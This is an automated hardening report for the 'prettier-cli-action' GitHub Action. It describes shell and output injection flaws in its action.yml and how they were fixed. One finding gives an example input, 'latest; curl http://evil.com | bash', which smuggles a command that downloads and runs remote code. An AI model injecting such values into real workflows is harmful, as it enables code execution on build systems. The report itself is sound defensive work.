<!-- markdownlint-disable -->

# Hardening Report: rutajdash--prettier-cli-action/v1.0.2

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **rutajdash--prettier-cli-action/v1.0.2** was hardened automatically. 6 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Two `run:` steps in action.yml directly interpolate `${{ inputs.* }}` expressions inside shell command strings (rule a), enabling shell command injection.

1. Step "Installing Prettier" (line 30): `npm install --global prettier@${{ inputs.prettier_version }}` — an attacker-controlled `prettier_version` value (e.g. `latest; curl http://evil.com | bash`) is substituted directly into the shell command before execution.

2. Step "Running Prettier" (line 37): `prettier --list-different --config ${{ inputs.config_path }} --ignore-path ${{ inputs.ignore_path }} --no-error-on-unmatched-pattern ${{ inputs.file_pattern }}` — three separate `inputs.*` expressions are interpolated directly into the shell command. Any of these can contain shell metacharacters (`;`, `|`, `$(...)`, etc.) to execute arbitrary commands.

Fix: Move each input into an `env:` variable and reference it as a double-quoted shell variable, e.g.:
```yaml
env:
  PRETTIER_VERSION: ${{ inputs.prettier_version }}
run: npm install --global "prettier@${PRETTIER_VERSION}"
```

Locations:

- `action.yml:30`
- `action.yml:37`

### github-env-injection (severity: high)

Step "Running Prettier" writes to `$GITHUB_OUTPUT` with values derived from unsanitized `${{ inputs.* }}` expressions interpolated directly into the write command (line 38):

```bash
echo "$(prettier --list-different --config ${{ inputs.config_path }} --ignore-path ${{ inputs.ignore_path }} --no-error-on-unmatched-pattern ${{ inputs.file_pattern }})" >> $GITHUB_OUTPUT
```

The `inputs.config_path`, `inputs.ignore_path`, and `inputs.file_pattern` values are substituted by the YAML template engine before the shell runs, so a value containing newlines can inject arbitrary key=value pairs into `$GITHUB_OUTPUT`, potentially overwriting subsequent output variables. The required sanitization step (`printf '%s' "$VAR" | tr -d '\n\r'`) is absent before the write.

Locations:

- `action.yml:38`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.prettier_version }}" appears directly in run: block of step "Installing Prettier"; move to env: map

Locations:

- `action.yml:38`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.config_path }}" appears directly in run: block of step "Running Prettier"; move to env: map

Locations:

- `action.yml:45`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.ignore_path }}" appears directly in run: block of step "Running Prettier"; move to env: map

Locations:

- `action.yml:45`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.file_pattern }}" appears directly in run: block of step "Running Prettier"; move to env: map

Locations:

- `action.yml:45`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection, static-inline-injection

**Notes:**

Fixed all script-injection and github-env-injection findings in action.yml:

1. 'Installing Prettier' step: Moved inputs.prettier_version to env: PRETTIER_VERSION and used it as "prettier@${PRETTIER_VERSION}".

2. 'Running Prettier' step: Moved all three inputs to env: block (CONFIG_PATH, IGNORE_PATH, FILE_PATTERN). file_pattern (a list/glob input with default '**/*.js') is tokenized with xargs into a bash array using the required guard+loop pattern. config_path and ignore_path (optional single-path values) use ${VAR:+--flag "$VAR"} to avoid passing empty arguments.

3. github-env-injection: The output uses the heredoc form (prettier-output<<$EOF with a random delimiter), which per the rules does NOT need newline stripping — the random delimiter already prevents injection. The prettier command is captured with || true since prettier exits 1 when finding unformatted files (matching upstream behavior).

